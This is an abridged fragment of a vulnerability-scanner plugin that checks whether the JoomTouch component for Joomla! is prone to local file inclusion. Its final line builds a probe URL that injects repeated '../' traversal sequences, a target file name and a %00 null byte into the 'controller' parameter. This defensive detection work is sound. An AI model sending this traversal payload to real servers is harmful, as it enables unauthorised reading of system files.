...
# $Id: gb_joomla_49180.nasl 13 2013-10-27 12:16:33Z jan $
#
...
tag_summary = "The JoomTouch component for Joomla! is prone to a local file-
...
JoomTouch 1.0.2 is affected; other versions may also be vulnerable.";
...
desc = "
 ...
 script_summary("Determine if JoomTouch component for Joomla! is prone to a local file include vulnerability");
...
foreach file (keys(files)) {
  ...
  url = string(dir,"/index.php?option=com_joomtouch&controller=",crap(data:"../",length:3*9),files[file],"%00"); 
